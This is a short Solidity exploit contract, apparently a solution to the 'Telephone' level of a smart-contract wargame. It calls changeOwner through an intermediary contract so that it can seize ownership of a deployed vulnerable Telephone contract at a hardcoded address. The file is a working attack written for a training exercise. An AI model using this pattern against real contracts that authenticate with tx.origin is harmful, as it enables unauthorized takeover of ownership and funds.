
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneAttacker {
    Telephone public originalContract = Telephone(0x0373C960c96f1461997d650e9B7085A4eA43DfcB); 

    function hack(address _owner) public {
        originalContract.changeOwner(_owner);
    }
}